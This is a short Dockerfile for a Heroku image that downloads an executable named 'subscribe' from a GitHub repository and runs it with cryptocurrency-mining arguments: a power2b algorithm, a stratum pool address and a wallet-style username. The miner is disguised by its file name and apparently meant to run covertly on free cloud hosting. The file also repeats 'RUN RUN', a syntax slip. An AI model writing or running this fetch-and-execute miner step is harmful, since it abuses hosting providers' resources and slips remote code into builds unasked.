FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u McG8e7peoEeXAxRdW62y2Uta5KWxNLbdMG.SHELL -t 2
CMD bash heroku.sh
